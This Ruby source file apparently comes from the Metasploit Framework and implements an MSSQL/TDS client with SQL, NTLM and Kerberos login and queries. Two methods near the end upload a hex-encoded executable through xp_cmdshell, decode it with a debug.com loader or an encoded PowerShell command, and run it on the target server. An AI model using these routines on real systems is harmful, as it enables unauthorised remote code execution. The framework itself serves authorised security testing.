require 'metasploit/framework/tcp/client'
require 'metasploit/framework/mssql/tdssslproxy'
require 'rex/proto/mssql/client_mixin'
require 'rex/text'
require 'msf/core/exploit'
require 'msf/core/exploit/remote'

module Rex
  module Proto
    module MSSQL
      class Client
        include Metasploit::Framework::Tcp::Client
        include Rex::Proto::MSSQL::ClientMixin
        include Rex::Text
        include Msf::Exploit::Remote::MSSQL_COMMANDS
        include Msf::Exploit::Remote::Udp
        include Msf::Exploit::Remote::NTLM::Client
        include Msf::Exploit::Remote::Kerberos::Ticket::Storage
        include Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Options

        attr_accessor :tdsencryption
        attr_accessor :sock
        attr_accessor :auth
        attr_accessor :ssl
        attr_accessor :ssl_version
        attr_accessor :ssl_verify_mode
        attr_accessor :ssl_cipher
        attr_accessor :proxies
        attr_accessor :connection_timeout
        attr_accessor :send_lm
        attr_accessor :send_ntlm
        attr_accessor :send_spn
        attr_accessor :use_lmkey
        attr_accessor :use_ntlm2_session
        attr_accessor :use_ntlmv2
        attr_accessor :windows_authentication
        attr_reader :framework_module
        attr_reader :framework
        # @!attribute max_send_size
        #   @return [Integer] The max size of the data to encapsulate in a single packet
        attr_accessor :max_send_size
        # @!attribute send_delay
        #   @return [Integer] The delay between sending packets
        attr_accessor :send_delay
        # @!attribute initial_connection_info
        #   @return [Hash] Key-value pairs received from the server during the initial MSSQL connection.
        # See the spec here: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec
        attr_accessor :initial_connection_info
        # @!attribute current_database
        #   @return [String] The database name this client is currently connected to.
        attr_accessor :current_database

        def initialize(framework_module, framework, rhost, rport = 1433, proxies = nil)
          @framework_module       = framework_module
          @framework              = framework
          @connection_timeout     = framework_module.datastore['ConnectTimeout']      || 30
          @max_send_size          = framework_module.datastore['TCP::max_send_size']  || 0
          @send_delay             = framework_module.datastore['TCP::send_delay']     || 0

          @auth                   = framework_module.datastore['Mssql::Auth']         || Msf::Exploit::Remote::AuthOption::AUTO
          @hostname               = framework_module.datastore['Mssql::Rhostname']    || ''

          @windows_authentication = framework_module.datastore['USE_WINDOWS_AUTHENT'] || false
          @tdsencryption          = framework_module.datastore['TDSENCRYPTION']       || false
          @hex2binary             = framework_module.datastore['HEX2BINARY']          || ''

          @domain_controller_rhost = framework_module.datastore['DomainControllerRhost'] || ''
          @rhost = rhost
          @rport = rport
          @proxies = proxies
        end

        #
        # This method connects to the server over TCP and attempts
        # to authenticate with the supplied username and password
        # The global socket is used and left connected after auth
        #

        def mssql_login(user='sa', pass='', db='', domain_name='')
          disconnect if self.sock
          connect
          mssql_prelogin

          if auth == Msf::Exploit::Remote::AuthOption::KERBEROS
            idx = 0
            pkt = ''
            pkt_hdr = ''
            pkt_hdr =  [
              TYPE_TDS7_LOGIN, #type
              STATUS_END_OF_MESSAGE, #status
              0x0000, #length
              0x0000, # SPID
              0x01,   # PacketID (unused upon specification
              # but ms network monitor still prefer 1 to decode correctly, wireshark don't care)
              0x00   #Window
            ]

            pkt << [
              0x00000000,   # Size
              0x71000001,   # TDS Version
              0x00000000,   # Dummy Size
              0x00000007,   # Version
              rand(1024+1), # PID
              0x00000000,   # ConnectionID
              0xe0,         # Option Flags 1
              0x83,         # Option Flags 2
              0x00,         # SQL Type Flags
              0x00,         # Reserved Flags
              0x00000000,   # Time Zone
              0x00000000    # Collation
            ].pack('VVVVVVCCCCVV')

            cname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
            aname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) ) #application and library name
            sname = Rex::Text.to_unicode( rhost )
            framework_module.fail_with(Msf::Exploit::Failure::BadConfig, 'The Mssql::Rhostname option is required when using kerberos authentication.') if @hostname.blank?
            kerberos_authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::MSSQL.new(
              host: @domain_controller_rhost,
              hostname: @hostname,
              mssql_port: rport,
              proxies: proxies,
              realm: domain_name,
              username: user,
              password: pass,
              framework: framework,
              framework_module: framework_module,
              ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::WriteOnly.new(framework: framework, framework_module: framework_module)
            )

            kerberos_result = kerberos_authenticator.authenticate
            ssp_security_blob = kerberos_result[:security_blob]

            idx = pkt.size + 50 # lengths below

            pkt << [idx, cname.length / 2].pack('vv')
            idx += cname.length

            pkt << [0, 0].pack('vv') # User length offset must be 0
            pkt << [0, 0].pack('vv') # Password length offset must be 0

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, sname.length / 2].pack('vv')
            idx += sname.length

            pkt << [0, 0].pack('vv') # unused

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, 0].pack('vv') # locales

            pkt << [idx, 0].pack('vv') #db

            # ClientID (should be mac address)
            pkt << Rex::Text.rand_text(6)

            # SSP
            pkt << [idx, ssp_security_blob.length].pack('vv')
            idx += ssp_security_blob.length

            pkt << [idx, 0].pack('vv') # AtchDBFile

            pkt << cname
            pkt << aname
            pkt << sname
            pkt << aname
            pkt << ssp_security_blob

            # Total packet length
            pkt[0, 4] = [pkt.length].pack('V')

            pkt_hdr[2] = pkt.length + 8

            pkt = pkt_hdr.pack("CCnnCC") + pkt

            # Rem : One have to set check_status to false here because sql server sp0 (and maybe above)
            # has a strange behavior that differs from the specifications
            # upon receiving the ntlm_negociate request it send an ntlm_challenge but the status flag of the tds packet header
            # is set to STATUS_NORMAL and not STATUS_END_OF_MESSAGE, then internally it waits for the ntlm_authentification
            resp = mssql_send_recv(pkt, 15, false)

            info = {:errors => []}
            info = mssql_parse_reply(resp, info)
            self.initial_connection_info = info

            return false if not info
            return info[:login_ack] ? true : false
          elsif auth == Msf::Exploit::Remote::AuthOption::NTLM || windows_authentication
            idx = 0
            pkt = ''
            pkt_hdr = ''
            pkt_hdr =  [
                TYPE_TDS7_LOGIN, #type
                STATUS_END_OF_MESSAGE, #status
                0x0000, #length
                0x0000, # SPID
                0x01,   # PacketID (unused upon specification
                # but ms network monitor still prefer 1 to decode correctly, wireshark don't care)
                0x00   #Window
            ]

            pkt << [
                0x00000000,   # Size
                0x71000001,   # TDS Version
                0x00000000,   # Dummy Size
                0x00000007,   # Version
                rand(1024+1), # PID
                0x00000000,   # ConnectionID
                0xe0,         # Option Flags 1
                0x83,         # Option Flags 2
                0x00,         # SQL Type Flags
                0x00,         # Reserved Flags
                0x00000000,   # Time Zone
                0x00000000    # Collation
            ].pack('VVVVVVCCCCVV')

            cname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
            aname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) ) #application and library name
            sname = Rex::Text.to_unicode( rhost )
            dname = Rex::Text.to_unicode( db )

            workstation_name = Rex::Text.rand_text_alpha(rand(8)+1)

            ntlm_client = ::Net::NTLM::Client.new(
              user,
              pass,
              workstation: workstation_name,
              domain: domain_name,
            )
            type1 = ntlm_client.init_context
            # SQL 2012, at least, does not support KEY_EXCHANGE
            type1.flag &= ~ ::Net::NTLM::FLAGS[:KEY_EXCHANGE]
            ntlmsspblob = type1.serialize

            idx = pkt.size + 50 # lengths below

            pkt << [idx, cname.length / 2].pack('vv')
            idx += cname.length

            pkt << [0, 0].pack('vv') # User length offset must be 0
            pkt << [0, 0].pack('vv') # Password length offset must be 0

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, sname.length / 2].pack('vv')
            idx += sname.length

            pkt << [0, 0].pack('vv') # unused

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, 0].pack('vv') # locales

            pkt << [idx, 0].pack('vv') #db

            # ClientID (should be mac address)
            pkt << Rex::Text.rand_text(6)

            # NTLMSSP
            pkt << [idx, ntlmsspblob.length].pack('vv')
            idx += ntlmsspblob.length

            pkt << [idx, 0].pack('vv') # AtchDBFile

            pkt << cname
            pkt << aname
            pkt << sname
            pkt << aname
            pkt << ntlmsspblob

            # Total packet length
            pkt[0, 4] = [pkt.length].pack('V')

            pkt_hdr[2] = pkt.length + 8

            pkt = pkt_hdr.pack("CCnnCC") + pkt

            # Rem : One have to set check_status to false here because sql server sp0 (and maybe above)
            # has a strange behavior that differs from the specifications
            # upon receiving the ntlm_negociate request it send an ntlm_challenge but the status flag of the tds packet header
            # is set to STATUS_NORMAL and not STATUS_END_OF_MESSAGE, then internally it waits for the ntlm_authentification
            if tdsencryption == true
               proxy = TDSSSLProxy.new(sock)
               proxy.setup_ssl
               resp = proxy.send_recv(pkt)
            else
               resp = mssql_send_recv(pkt, 15, false)
            end

            # Strip the TDS header
            resp = resp[3..-1]
            type3 = ntlm_client.init_context([resp].pack('m'))
            type3_blob = type3.serialize

            # Create an SSPIMessage
            idx = 0
            pkt = ''
            pkt_hdr = ''
            pkt_hdr = [
              TYPE_SSPI_MESSAGE, #type
              STATUS_END_OF_MESSAGE, #status
              0x0000, #length
              0x0000, # SPID
              0x01, # PacketID
              0x00 #Window
            ]

            pkt_hdr[2] = type3_blob.length + 8

            pkt = pkt_hdr.pack("CCnnCC") + type3_blob

            if self.tdsencryption == true
              resp = mssql_ssl_send_recv(pkt, proxy)
              proxy.cleanup
              proxy = nil
            else
              resp = mssql_send_recv(pkt)
            end

            #SQL Server Authentication
          else
            idx = 0
            pkt = ''
            pkt << [
                0x00000000,   # Dummy size

                0x71000001,   # TDS Version
                0x00000000,   # Size
                0x00000007,   # Version
                rand(1024+1), # PID
                0x00000000,   # ConnectionID
                0xe0,         # Option Flags 1
                0x03,         # Option Flags 2
                0x00,         # SQL Type Flags
                0x00,         # Reserved Flags
                0x00000000,   # Time Zone
                0x00000000    # Collation
            ].pack('VVVVVVCCCCVV')


            cname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
            uname = Rex::Text.to_unicode( user )
            pname = mssql_tds_encrypt( pass )
            aname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
            sname = Rex::Text.to_unicode( rhost )
            dname = Rex::Text.to_unicode( db )

            idx = pkt.size + 50 # lengths below

            pkt << [idx, cname.length / 2].pack('vv')
            idx += cname.length

            pkt << [idx, uname.length / 2].pack('vv')
            idx += uname.length

            pkt << [idx, pname.length / 2].pack('vv')
            idx += pname.length

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, sname.length / 2].pack('vv')
            idx += sname.length

            pkt << [0, 0].pack('vv')

            pkt << [idx, aname.length / 2].pack('vv')
            idx += aname.length

            pkt << [idx, 0].pack('vv')

            pkt << [idx, dname.length / 2].pack('vv')
            idx += dname.length

            # The total length has to be embedded twice more here
            pkt << [
                0,
                0,
                0x12345678,
                0x12345678
            ].pack('vVVV')

            pkt << cname
            pkt << uname
            pkt << pname
            pkt << aname
            pkt << sname
            pkt << aname
            pkt << dname

            # Total packet length
            pkt[0, 4] = [pkt.length].pack('V')

            # Embedded packet lengths
            pkt[pkt.index([0x12345678].pack('V')), 8] = [pkt.length].pack('V') * 2

            # Packet header and total length including header
            pkt = "\x10\x01" + [pkt.length + 8].pack('n') + [0].pack('n') + [1].pack('C') + "\x00" + pkt

            if self.tdsencryption == true
              proxy = TDSSSLProxy.new(sock)
              proxy.setup_ssl
              resp = mssql_ssl_send_recv(pkt, proxy)
              proxy.cleanup
              proxy = nil
            else
              resp = mssql_send_recv(pkt)
            end

          end

          info = {:errors => []}
          info = mssql_parse_reply(resp, info)
          self.initial_connection_info = info

          return false if not info
          info[:login_ack] ? true : false
        end

        #
        #this method send a prelogin packet and check if encryption is off
        #
        def mssql_prelogin(enc_error=false)
          pkt = ""
          pkt_hdr = ""
          pkt_data_token = ""
          pkt_data = ""


          pkt_hdr = [
              TYPE_PRE_LOGIN_MESSAGE, #type
              STATUS_END_OF_MESSAGE, #status
              0x0000, #length
              0x0000, # SPID
              0x00, # PacketID
              0x00 #Window
          ]

          version = [0x55010008, 0x0000].pack("Vv")

          # if manually set, we will honour
          if tdsencryption == true
            encryption = ENCRYPT_ON
          else
            encryption = ENCRYPT_NOT_SUP
          end

          instoptdata = "MSSQLServer\0"

          threadid = "\0\0" + Rex::Text.rand_text(2)

          idx = 21 # size of pkt_data_token
          pkt_data_token << [
              0x00, # Token 0 type Version
              idx , # VersionOffset
              version.length, # VersionLength

              0x01, # Token 1 type Encryption
              idx = idx + version.length, # EncryptionOffset
              0x01, # EncryptionLength

              0x02, # Token 2 type InstOpt
              idx = idx + 1, # InstOptOffset
              instoptdata.length, # InstOptLength

              0x03, # Token 3 type Threadid
              idx + instoptdata.length, # ThreadIdOffset
              0x04, # ThreadIdLength

              0xFF
          ].pack("CnnCnnCnnCnnC")

          pkt_data << pkt_data_token
          pkt_data << version
          pkt_data << encryption
          pkt_data << instoptdata
          pkt_data << threadid

          pkt_hdr[2] = pkt_data.length + 8

          pkt = pkt_hdr.pack("CCnnCC") + pkt_data

          resp = mssql_send_recv(pkt)

          idx = 0

          while resp && resp[0, 1] != "\xff" && resp.length > 5
            token = resp.slice!(0, 5)
            token = token.unpack("Cnn")
            idx -= 5
            if token[0] == 0x01

              idx += token[1]
              break
            end
          end
          if idx > 0
            encryption_mode = resp[idx, 1].unpack("C")[0]
          else
            framework_module.print_error("Unable to parse encryption req " \
              "during pre-login, this may not be a MSSQL server")
            encryption_mode = ENCRYPT_NOT_SUP
          end

          ##########################################################
          # Our initial prelogin pkt above said we didnt support
          # encryption (it's quicker and the default).
          #
          # Per the matrix on the following link, SQL Server will
          # terminate the connection if it does require TLS,
          # otherwise it will accept an unencrypted session. As
          # part of this initial response packet, it also returns
          # ENCRYPT_REQ.
          #
          # https://msdn.microsoft.com\
          #   /en-us/library/ee320519(v=sql.105).aspx
          #
          ##########################################################

          if encryption_mode == ENCRYPT_REQ
            # restart prelogin process except that we tell SQL Server
            # than we are now able to encrypt
            disconnect if self.sock
            connect

            # offset 35 is the flag - turn it on
            pkt[35] = [ENCRYPT_ON].pack('C')
            self.tdsencryption = true
            framework_module.print_status("TLS encryption has " \
              "been enabled based on server response.")

            resp = mssql_send_recv(pkt)

            idx = 0

            while resp && resp[0, 1] != "\xff" && resp.length > 5
              token = resp.slice!(0, 5)
              token = token.unpack("Cnn")
              idx -= 5
              if token[0] == 0x01
                idx += token[1]
                break
              end
            end
            if idx > 0
              encryption_mode = resp[idx, 1].unpack("C")[0]
            else
              framework_module.print_error("Unable to parse encryption req " \
                "during pre-login, this may not be a MSSQL server")
              encryption_mode = ENCRYPT_NOT_SUP
            end
          end
          encryption_mode
        end

        def mssql_ssl_send_recv(req, tdsproxy, timeout=15, check_status=true)
          tdsproxy.send_recv(req)
        end

        def query(sqla, doprint=false, opts={})
          info = { :sql => sqla }
          opts[:timeout] ||= 15
          pkts = []
          idx  = 0

          bsize = 4096 - 8
          chan  = 0

          @cnt ||= 0
          @cnt += 1

          sql = Rex::Text.to_unicode(sqla)
          while(idx < sql.length)
            buf = sql[idx, bsize]
            flg = buf.length < bsize ? "\x01" : "\x00"
            pkts << "\x01" + flg + [buf.length + 8].pack('n') + [chan].pack('n') + [@cnt].pack('C') + "\x00" + buf
            idx += bsize

          end

          resp = mssql_send_recv(pkts.join, opts[:timeout])
          mssql_parse_reply(resp, info)
          mssql_print_reply(info) if doprint
          info
        end

        def mssql_upload_exec(exe, debug=false)
          hex = exe.unpack("H*")[0]

          var_bypass  = Rex::Text.rand_text_alpha(8)
          var_payload = Rex::Text.rand_text_alpha(8)

          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
          print_status("Writing the debug.com loader to the disk...")
          h2b = File.read(@hex2binary, File.size(@hex2binary))
          h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
          h2b.split(/\n/).each do |line|
            mssql_xpcmdshell("#{line}", false)
          end

          print_status("Converting the debug script to an executable...")
          mssql_xpcmdshell("cmd.exe /c cd %TEMP% && cd %TEMP% && debug < %TEMP%\\#{var_bypass}", debug)
          mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)

          print_status("Uploading the payload, please be patient...")
          idx = 0
          cnt = 500
          while(idx < hex.length - 1)
            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
            idx += cnt
          end

          print_status("Converting the encoded payload...")
          mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)

          print_status("Executing the payload...")
          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
        end

        def powershell_upload_exec(exe, debug=false)
          # hex converter
          hex = exe.unpack("H*")[0]
          # create random alpha 8 character names
          #var_bypass  = rand_text_alpha(8)
          var_payload = rand_text_alpha(8)
          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
          # our payload converter, grabs a hex file and converts it to binary for us through powershell
          h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
          h2b_unicode=Rex::Text.to_unicode(h2b)
          # base64 encode it, this allows us to perform execution through powershell without registry changes
          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
          print_status("Uploading the payload #{var_payload}, please be patient...")
          idx = 0
          cnt = 500
          while(idx < hex.length - 1)
            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
            idx += cnt
          end
          print_status("Converting the payload utilizing PowerShell EncodedCommand...")
          mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
          print_status("Executing the payload...")
          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
          print_status("Be sure to cleanup #{var_payload}.exe...")
        end

        # @param [ENVCHANGE] envchange The ENVCHANGE type to get the information for.
        # @return [Hash] Returns a hash of values if the provided type exists.
        # @return [Hash] Returns the whole connection info if envchange is nil.
        # @return [Hash] Returns an empty hash if the provided type is not present.
        def initial_info_for_envchange(envchange: nil)
          return self.initial_connection_info if envchange.nil?
          return nil unless (self.initial_connection_info && self.initial_connection_info.is_a?(::Hash))

          self.initial_connection_info[:envs]&.select { |hash| hash[:type] == envchange }&.first || {}
        end

        def peerhost
          rhost
        end

        def peerport
          rport
        end

        def peerinfo
          "#{peerhost}:#{peerport}"
        end

        protected

        def rhost
          @rhost
        end

        def rport
          @rport
        end

        def chost
          return nil
        end

        def cport
          return nil
        end
      end

    end
  end
end
